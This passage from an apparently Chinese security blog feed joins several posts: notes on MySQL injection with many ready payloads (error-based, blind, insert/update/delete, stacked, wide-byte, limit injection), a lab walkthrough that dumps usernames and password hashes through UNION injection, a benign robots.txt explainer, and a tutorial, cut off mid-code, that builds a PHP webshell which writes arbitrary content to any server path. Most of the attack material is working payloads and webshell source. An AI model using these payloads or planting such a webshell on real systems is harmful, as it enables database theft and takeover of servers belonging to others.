class="headerlink" title="extractvalue()注入"></a>extractvalue()注入</h3><p>extractvalue和updatexml差不多，我这就只略过</p><pre><code># 获取数据username=1&#39; and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e))--+</code></pre><h2 id="几何函数注入"><a href="#几何函数注入" class="headerlink" title="几何函数注入"></a>几何函数注入</h2><ul><li>geometrycollection</li><li>multipoint</li><li>polygon</li><li>multipolygon</li><li>linestring</li><li>multilinestring</li></ul><blockquote><p>Tips：<code>mysql 5.5.47</code> 可以执行，&gt;=5.5.53则不可以<br>函数对参数要求是(1 2,3 3,2 2 1)这样的几何数据，如果不满足要求，则会报错</p></blockquote><pre><code>username=1&#39; and geometrycollection((select * from (select * from (select version())a)b)) --+</code></pre><h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><ul><li>exp</li></ul><p>5.5之前，整形溢出是不会报错的</p><pre><code>select 18446744073709551615+1</code></pre><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用<code>按位取反运算</code>即可</p><pre><code>select ~0</code></pre><p>如果一个查询成功返回，则其返回值，进行逻辑非运算后可得1，这个值是可以进行数学运算的</p><pre><code># Mysql中select (select * from (select user()x))</code></pre><p>同理exp函数也会产生类似的溢出错误</p><pre><code>username=1&#39; and exp(~(select * from(select user())x)) --+</code></pre><p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了</p><blockquote><p>Tips：5.5.7可以，&gt;=5.5.53不行</p></blockquote><pre><code>select (select(!x-~0)from(select(select user())x)a)</code></pre><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><ul><li>floor</li></ul><p><code>count</code>、<code>group by</code>在遇到<code>rand</code>产生的重复值时报错的思路</p><ul><li>count<blockquote><p>包括列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为Null的记录</p></blockquote></li><li>group by<blockquote><p>利用分组信息进行统计</p></blockquote></li><li>rand<blockquote><p>0和1之间产生一个随机数</p></blockquote></li><li>floor<blockquote><p>返回 小于等于 该值得最大整数</p></blockquote></li></ul><pre><code># 3条以上记录进行查询select count(*) from users group by floor(rand(0)*2)</code></pre><blockquote><p>Tips：floor(rand(0)*2)，报错是有条件的，记录必须3条以上，而且在3条以上必定报错</p></blockquote><pre><code>selec count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x</code></pre><p>报错本质：floor(rand(0)<em>2)的重复性，导致group by出错<br>*</em>group by key的原理：**</p><blockquote><p>循环读取数据的每一行，将结果保存于临时表中<br>读取每一行的key，如果key存在于临时表中，则不再临时表中更新数据<br>如果key不再，则插入所在行的数据</p></blockquote><p><strong>rand()函数在查询的时候回执行一次，插入的时候还会执行一次</strong>，这就是整个语句报错的关键<br>floor(rand(0)*2)前六位是 011011 group by x先建立一个空表用于分组，然后进行分组查询<br>第一次rand()执行，查询的结果是0，因为是空表所以插入这条数据，而插入的时候rand()又执行了一次，所以</p><p><strong>floor()报错注入，混乱没理解，待重写</strong></p><hr><h1 id="盲注攻击-–-时间盲注"><a href="#盲注攻击-–-时间盲注" class="headerlink" title="盲注攻击 – 时间盲注"></a>盲注攻击 – 时间盲注</h1><ul><li>判断数据库长度<pre><code>and+if(length(database())=4,0,sleep(5))</code></pre></li><li>获取表名<pre><code># 判断表名长度and+if(length(table_name)=5,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1</code></pre></li></ul><h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><p>//mid进行获取<br>and+if(mid(table_name,1,1)=’u’,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1</p><p>//ord进行获取<br>and+if(ord(mid(table_name,1,1))=117,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1</p><pre><code>* 获取列名</code></pre><h1 id="判断列名长度"><a href="#判断列名长度" class="headerlink" title="判断列名长度"></a>判断列名长度</h1><p>and+if(length(column_name)=5,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p><h1 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h1><p>//mid进行获取<br>and+if(mid(column_name,1,1)=’i’,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p><p>//ord进行获取<br>and+if(ord(mid(table_name,1,1))=105,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p><pre><code>---# Mysql_insert 三种注入有的网站会记录用户浏览记录，包括referer，client_ip,user-agent以及一些其他的功能（用户注册，密码修改，信息删除等）&gt; insert,delete,update,limit</code></pre><p>insert Into：插入数据<br>Insert Into table_name(field1,field2,fieldN) Values (value1,value2,valueN)</p><p>update：用于修改或更新Mysql中的数据<br>修改数据通用语法：update table_name SET field1=new_value1,field2=new_value2 where Clause</p><p>delete：删除Mysql中的数据<br>通用删除语法：DELETE from table_name where Clause</p><pre><code>&gt; Ps1：单双引号要根据查询，来决定注入时使用引号的问题&gt; Ps2:在这些类型的注入中Mysql中的 -，#，不会注释掉查询的其他部分，会被当做普通字符处理## updatexml()获取数据在这里，我们通常使用updatexml()和extractdata()函数payload：`or updatexml(1,concat(0x7e,(version())),0) or &#39;&#39;`例子</code></pre><h1 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h1><p>INSERT INTO users(id,username,password) values (‘10’,’xxx’ or updatexml(1,concat(0x7e,(version())),0) or’’,’123456’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p><h1 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h1><p>delete from users where id=9 or updatexml(1,concat(0x7e,(version())),0) or ‘’;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p><h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><p>update users SET username=’123’,password=’Nicky’ or updatexml(1,concat(0x7e,(version())),0) or ‘’ where id=9;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p><pre><code>* 获取表名,列名，数据&gt; payload：`or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or &#39;&#39;`</code></pre><h1 id="Insert-1"><a href="#Insert-1" class="headerlink" title="Insert"></a>Insert</h1><p>获取表<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~users’</p><p>获取列<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=’users’ limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~user_id’</p><p>获取数据<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:’,id, username, password) FROM users limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~1:Dumb:Dumb’</p><h1 id="Delete-1"><a href="#Delete-1" class="headerlink" title="Delete"></a>Delete</h1><p>获取数据<br>DELETE FROM users WHERE id=1 or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:’,id,username, password) FROM users limit 0,1)),0) or ‘’;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~1:Dumb:Dumb’</p><pre><code>&gt; Ps:可以在insert。update和dalete语句中使用updatexml()函数检索表，列，但是，`如果你在同一个表中，则不能使用update语句转储数据`！```mysqlUPDATE users SET password=&#39;Nicky&#39; or updatexml(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM newdb.users limit 0,1)),0) or&#39;&#39; WHERE id=2 and username=&#39;Olivia&#39;;ERROR 1146 (42S02): Table &#39;newdb.users&#39; doesn&#39;t exist&#39;&#39;&#39;这里不会提供任何数据，因为我们试图使用目标数据库来转储数据如果注入点在其他表库，我们可以从另一个表中转储数据，而不是从表本身的数据中转储数据这只适用于Update语句&#39;&#39;&#39;成功UPDATE news SET title=&#39;Nicky&#39; or Updatexml(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM test.users limit 0,1)),0) or&#39;&#39; WHERE id=1;ERROR 1105 (HY000): XPATH syntax error: &#39;~1:Dumb:Dumb&#39;</code></pre><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload：<code>or extractvalue(1,concat(0x7e,database())) or &#39;&#39;</code></p><pre><code># 获取数据INSERT INTO users (id, username, password) VALUES (2,&#39;Olivia&#39; or extractvalue(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM users limit 0,1))) or &#39;&#39;, &#39;Nervo&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~1:Dumb:Dumb&#39;</code></pre><p>这里和updatexml()的大同小异，就不详细写出来了<br>相同的规则适用于updatexml()方法中提到的update语句</p><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h2><p>此处还是有点不理解。。。。待重写</p><p>此函数是在mysql版本5.0.12中添加的</p><pre><code>name_const(name,value)作用：返回给定的值,当用来产生一个结果集合列时, name_const()促使该列使用给定名称</code></pre><p>payload：<code>or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or &#39;&#39;</code></p><blockquote><p>Ps：在mysql最新版本中，只能从该函数获中获取版本，&gt;=5.0.12的旧版本中，可以进一步提取数据</p></blockquote><pre><code>INSERT INTO users (id, username, password) VALUES (1,&#39;Olivia&#39; or (SELECT*FROM(SELECT name_const((SELECT 2),1),name_const((SELECT 2),1))a) or &#39;&#39;, &#39;Nervo&#39;)ERROR 1210 (HY000): Incorrect arguments to NAME_CONST得到该错误就不用继续了</code></pre><p>由于我的环境问题，我这就直接把语句粘贴进来，大家自行测试吧</p><pre><code># 获取表INSERT INTO users (id, username, password) VALUES (1,&#39;Olivia&#39; or (SELECT*FROM(SELECTname_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1))a) or &#39;&#39;,&#39;Nervo&#39;);# 获取数据INSERT INTO users (id, username, password) VALUES (2,&#39;Olivia&#39; or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1))a) or &#39;&#39;, &#39;Nervo&#39;);</code></pre><hr><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>堆叠查询可以执行多语句，多语句之间以分号(;)隔开<br>通过添加一个新的查询或者终止查询，可以达到修改数据和调用存储过程的目的</p><blockquote><p>局限：并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制或权限不足</p></blockquote><p>这里可以使用的注入方式：盲注，堆叠注入（堆查注入）</p><pre><code class="php"># 测试脚本# 该脚本来自于《Web安全攻防》try{    $conn = new PDO(&quot;mysql:host=localhost;dbname=test&quot;,&quot;root&quot;,&quot;root&quot;);    $conn -&gt; setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);    $stmt = $conn -&gt; query(&quot;SELECT * FROM users where `id` =&#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;&quot;);    $result = $stmt -&gt; setFetchMode(PDO::FETCH_ASSOC);    foreach($stmt-&gt;fetchAll() as $k=&gt;$v ){        foreach($v as $key =&gt; $value){            echo $value;        }    }    $dsn = null;}catch(PDOException $e){    echo &quot;error&quot;;}$conn = null;</code></pre><blockquote><p>Sql执行语句：$stmt = $conn -&gt; query(“SELECT * FROM users where `id` =’”.$_GET[‘id’].”‘“);</p></blockquote><pre><code># 堆叠语句id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;,0,slepp(5)) %23# update更新数据id=1&#39;;update users SET username=user() where id=1 %23原数据会被覆盖掉</code></pre><p>这里产生的原因：PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到结果，PDO只会返回第一条执行的结果<br>可以使用update更新数据/insert插入再进行访问或者使用盲注获取数据</p><hr><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p><code>mysql_escape_string，addslashes</code> 过滤和转义一些特殊字符的函数<br>在对数据都进行一些转义，但是转义后的”&quot;并不会插入到数据库中</p><p>此处待实验。。。</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p><img src="/images%5CWeb%5CSql%5Ctwo.png" srcset="/img/loading.gif" alt=""><br>系统没有对已经存入数据库的数据做检测</p><p>先构造语句，有被转义字符的语句，把恶意语句存入数据库<br>然后，我们进行二次构造语句</p><hr><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>如果’被转义成<br>当数据库的编码为GBK时，并且在数据库查询前执行GBK编码设置，就可以使用宽字节注入<br>宽字节的格式是在地址后先加一个<code>%df&#39;</code></p><p>在GBK编码中，%df%5c是繁体字“蓮”，所以这时，可以造成单引号逃逸！<br>payload：<code>1%df&#39; %23</code></p><p>如果进行查询数据库的表名之类时，由于单引号被转义，导致SQL语句出错，所以需要利用<code>嵌套查询</code><br>查询表名：<code>select table_name from information_schema.tables where table_schema=(select database()) limit 0,1</code><br>查看字段：<code>select column_name from information_schema.columns where table_schema=(select database()) and table_name = (select table_name from information_schema.tables wherer table_schema=(select database()) limit 0,1) limit 0,1</code><br>第一层是：table_schema，第二和第三层：table_name<br>limit 第一个：表名，第二个：字段名</p><p>如果把数据库编码改成gb2312,是没有注入的<br>这归结于gb2312编码的取值范围，它的高位范围0xA1<del>0xF7，低范围0xA1</del>0xFE，而\是0x5c<br>只有在低范围中含有0x5c的编码，就可以进行宽字符注入</p><hr><h1 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h1><p>HTTP请求头中有一个<code>X-Forwarded-for</code>参数<br>代表客户端真实的IP，修改则可以伪造客户端IP</p><p>在该参数中进行测试即可！</p><hr><h1 id="Mysql-limit注入"><a href="#Mysql-limit注入" class="headerlink" title="Mysql limit注入"></a>Mysql limit注入</h1><p>适用于5.x中，在limit语句后面的注入</p><pre><code>select field from table where id&gt;0 order by id limit injection_point</code></pre><p>上面的语句包含了order by，mysql当中union语句不能在order by的后面</p><pre><code>SELECT     [ALL | DISTINCT | DISTINCTROW ]       [HIGH_PRIORITY]       [STRAIGHT_JOIN]       [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]       [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]     select_expr [, select_expr ...]     [FROM table_references     [WHERE where_condition]     [GROUP BY {col_name | expr | position}       [ASC | DESC], ... [WITH ROLLUP]]     [HAVING where_condition]     [ORDER BY {col_name | expr | position}       [ASC | DESC], ...]     [LIMIT {[offset,] row_count | row_count OFFSET offset}]     [PROCEDURE procedure_name(argument_list)]     [INTO OUTFILE &#39;file_name&#39; export_options       | INTO DUMPFILE &#39;file_name&#39;       | INTO var_name [, var_name]]     [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><blockquote><p>Ps：limti 后面可以跟两个函数，PROCEDURE 和 INTO</p></blockquote><ul><li>INTO除非有些shell的权限，否则无法利用</li><li>procedure analyse()后面可以跟两个函数<pre><code>是Mysql内置对Mysql字段值进行统计分析后给出建议的字段类型</code></pre></li></ul><p>利用</p><pre><code># 报错SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); # 直接使用sleep不行，需要用BENCHMARK代替SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.ms08067.com/" target="_blank" rel="noopener">http://www.ms08067.com/</a><br><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">https://xz.aliyun.com/</a><br><a href="http://www.xiaodi8.com/" target="_blank" rel="noopener">http://www.xiaodi8.com/</a></p><p>大部分内容都是摘抄下来的，感谢各位！</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场Sql字符串注入</title>
    <link href="/2019/08/18/Web/Sql_str/"/>
    <url>/2019/08/18/Web/Sql_str/</url>
    
    <content type="html"><![CDATA[<h1 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h1><p>由于久了没手动了，今天就在靶场进行下手工吧。。。</p><h1 id="猜测语句"><a href="#猜测语句" class="headerlink" title="猜测语句"></a>猜测语句</h1><pre><code>$id = $_GET[&#39;x&#39;];select * from news where id=&#39;admin&#39;;select * from news where id=&quot;admin&quot;;</code></pre><a id="more"></a><p>看到以上语句，我们可以猜测一下，字符串引号的类型，并把它闭合下</p><pre><code>/new_list.php?id=tingjigonggao&#39; %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/two.jpg" srcset="/img/loading.gif" alt=""><br>可以看到闭合后，是报错的，我们试一下<code>&#39;</code>闭合</p><pre><code>/new_list.php?id=tingjigonggao&#39; %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/one.jpg" srcset="/img/loading.gif" alt=""><br>证明是<code>&#39;</code>闭合的</p><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><ul><li><p>猜字段</p><pre><code>/new_list.php?id=tingjigonggao&#39; order by 4 %23</code></pre></li><li><p>获取当前用户和数据库名</p><pre><code>/new_list.php?id=tingjigonggao%27 and 1=2 union select 1,user(),database(),4 %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/database.jpg" srcset="/img/loading.gif" alt=""></p></li><li><p>查看所有表名</p><pre><code>/new_list.php?id=tingjigonggao&#39; and 1=2 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/tables.jpg" srcset="/img/loading.gif" alt=""></p></li><li><p>查字段</p><pre><code>/new_list.php?id=tingjigonggao&#39; and 1=2 union select 1,group_concat(COLUMN_NAME),3,4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/columns.jpg" srcset="/img/loading.gif" alt=""></p></li><li><p>dump数据</p><pre><code>/new_list.php?id=tingjigonggao&#39; and 1=2 union select 1,group_concat(name,0x3a,password),3,4 from stormgroup_member %23</code></pre><p><img src="/images/Web/Sql/Sql%E5%AD%97%E7%AC%A6%E4%B8%B2/dump.jpg" srcset="/img/loading.gif" alt=""></p></li></ul><p>之后解密md5就可以登录后台了，前提是你们找得到后台地址（手动滑稽）</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【学习篇】Robots协议(也称为爬虫协议，机器人协议)</title>
    <link href="/2019/08/18/Web/Robots%E5%8D%8F%E8%AE%AE/"/>
    <url>/2019/08/18/Web/Robots%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol）<br>网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p><h3 id="robots-txt-文件"><a href="#robots-txt-文件" class="headerlink" title="robots.txt 文件"></a>robots.txt 文件</h3><p>是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它 。<br>robots.txt是一个<code>协议</code>，而不是一个命令。<br>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。<br>robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p><a id="more"></a><p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt<br>如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<br>如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。<br>如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><h3 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h3><p>1、搜索技术应服务于人类，同时尊重信息提供者的意愿，并维护其隐私权；<br>2、网站有义务保护其使用者的个人信息和隐私不被侵犯。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；<br>可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；<br>可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p><h3 id="文件写法"><a href="#文件写法" class="headerlink" title="文件写法"></a>文件写法</h3><pre><code>User-agent: * 这里的*代表的所有的搜索引擎种类，*是一个通配符Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下的所有以&quot;.htm&quot;为后缀的URL(包含子目录)。Disallow: /*?* 禁止访问网站中所有包含问号 (?) 的网址Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片Allow: /cgi-bin/　这里定义是允许爬寻cgi-bin目录下面的目录Allow: .htm$ 仅允许访问以&quot;.htm&quot;为后缀的URL。Allow: .gif$ 允许抓取网页和gif格式图片Sitemap: 网站地图 告诉爬虫这个页面是网站地图Crawl-delay: 100    后面的数值100表示告诉蜘蛛程序，以秒为单位的最低延时。如果crawler频率对您的服务器是一个负担，您可以将这个延时设定为任何您认为恰当的数字，每间隔100s来爬行一次。Crawl-delay 翻译成中文意思是抓取延迟</code></pre><h3 id="文件用法"><a href="#文件用法" class="headerlink" title="文件用法"></a>文件用法</h3><pre><code>User-agent:后的*具有特殊的含义，代表“any robot”，所以在该文件中不能有“Disallow: /tmp/*” or “Disallow:*.gif”这样的记录出现。User-agent: *Disallow: /cgi-bin/Disallow: /tmp/Disallow: /~joe/</code></pre>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP简易小马编写</title>
    <link href="/2019/08/18/Web/PHP%E5%B0%8F%E9%A9%AC%E5%9F%BA%E6%9C%AC%E7%BC%96%E5%86%99/"/>
    <url>/2019/08/18/Web/PHP%E5%B0%8F%E9%A9%AC%E5%9F%BA%E6%9C%AC%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h2 id="大概页面"><a href="#大概页面" class="headerlink" title="大概页面"></a>大概页面</h2><p>一个是你需要保存的文件地址<br>一个是你提交数据的<br>一个提交数据的按钮</p><pre><code class="html">&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;    上传路径: &lt;input type=&#39;text&#39; name=&#39;path&#39; tyle=&quot;width:400px&quot; value=&quot;&lt;?php echo __DIR__.&quot;\\&quot;;?&gt;&quot; /&gt;&lt;br&gt;&gt;    提交内容&lt;br&gt;    &lt;textarea name=&#39;comm&#39; rows=&quot;10&quot; cols=&quot;54&quot;&gt;&lt;/textarea&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;write&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/0.png" srcset="/img/loading.gif" alt=""></p><a id="more"></a><h2 id="上传功能实现"><a href="#上传功能实现" class="headerlink" title="上传功能实现"></a>上传功能实现</h2><p>判断以path和comm命名的数据不能为空<br><code>if (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){}</code><br>不为空写入数据</p><pre><code class="php">&lt;?phpif (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){    $getpath = fopen($_POST[&quot;path&quot;],&quot;a&quot;);    if(!$getpath){        echo &quot;写入失败！请换个目录试试！&quot;;    }else{        fputs($getpath,$_POST[&quot;comm&quot;]);        fclose($getpath);        echo &quot;上传: OK !&quot;;    }}?&gt;</code></pre><h2 id="添加显示我们一般需要的数据"><a href="#添加显示我们一般需要的数据" class="headerlink" title="添加显示我们一般需要的数据"></a>添加显示我们一般需要的数据</h2><p>当前路径 <code>__FILE__</code><br>PHP版本 <code>PHP_VERSION</code><br>IP地址 <code>gethostbyname($_SERVER[&quot;SERVER_NAME&quot;])</code><br>操作系统 <code>PHP_OS</code></p><p>这些数据我们用 表格显示</p><pre><code class="php">&lt;?php echo &#39;&lt;table border=&quot;1&quot; width=&quot;600&quot;&gt;&#39;;echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;echo &#39;&lt;th&gt;当前路径&lt;/th&gt;&lt;th&gt;&#39;,__FILE__,&#39;&lt;/th&gt;&#39;;echo &#39;&lt;/tr&gt;&#39;;echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;echo &#39;&lt;th&gt;PHP版本&lt;/th&gt;&lt;th&gt;&#39;,PHP_VERSION,&#39;&lt;/th&gt;&#39;;echo &quot;&lt;/tr&gt;&quot;;echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;echo &#39;&lt;th&gt;IP地址&lt;/th&gt;&lt;th&gt;&#39;,gethostbyname($_SERVER[&quot;SERVER_NAME&quot;]),&#39;&lt;/th&gt;&#39;;echo &quot;&lt;/tr&gt;&quot;;echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;echo &#39;&lt;th&gt;操作系统&lt;/th&gt;&lt;th&gt;&#39;,PHP_OS,&#39;&lt;/th&gt;&#39;;echo &quot;&lt;/tr&gt;&quot;;echo &quot;&lt;/table&gt;&quot;?&gt;</code></pre><p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/1.png" srcset="/img/loading.gif" alt=""></p><p>到此我们非常简易的小马就写好了,接下来就是稍微美化下<br>毕竟美观很重要</p><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>背景设置为黑<code>&lt;body bgcolor=&quot;#000&quot;&gt;</code><br>字体设置为红色<code>&lt;form action=&quot;&quot; method=&quot;POST&quot; style=&quot;color:red;&quot;&gt;</code><br>添加<code>hr</code>划分<code>&lt;hr&gt;</code></p><h2 id="最终代码及效果图"><a href="#最终代码及效果图" class="headerlink" title="最终代码及效果图"></a>最终代码及效果图</h2><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;sunsky&lt;/title&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000&quot;&gt;    &lt;form action=&quot;&quot; method=&quot;POST&quot; style=&quot;color:red;&quot;&gt;    &lt;?php     echo &#39;&lt;table border=&quot;1&quot; width=&quot;600&quot;&gt;&#39;;    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;    echo &#39;&lt;th&gt;当前路径&lt;/th&gt;&lt;th&gt;&#39;,__FILE__,&#39;&lt;/th&gt;&#39;;    echo &#39;&lt;/tr&gt;&#39;;    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;    echo &#39;&lt;th&gt;PHP版本&lt;/th&gt;&lt;th&gt;&#39;,PHP_VERSION,&#39;&lt;/th&gt;&#39;;    echo &quot;&lt;/tr&gt;&quot;;    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;    echo &#39;&lt;th&gt;IP地址&lt;/th&gt;&lt;th&gt;&#39;,gethostbyname($_SERVER[&quot;SERVER_NAME&quot;]),&#39;&lt;/th&gt;&#39;;    echo &quot;&lt;/tr&gt;&quot;;    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;    echo &#39;&lt;th&gt;操作系统&lt;/th&gt;&lt;th&gt;&#39;,PHP_OS,&#39;&lt;/th&gt;&#39;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;/table&gt;&quot;;?&gt;    &lt;hr&gt;    上传路径:&lt;input type=&#39;text&#39; name=&#39;path&#39; style=&quot;width:400px&quot; value=&quot;&lt;?php echo __DIR__.&quot;\\&quot;;?&gt;&quot; /&gt;&lt;br&gt;    提交数据&lt;br&gt;    &lt;textarea name=&#39;comm&#39; rows=&quot;10&quot; cols=&quot;54&quot;&gt;&lt;/textarea&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;write&quot;&gt;    &lt;hr&gt;    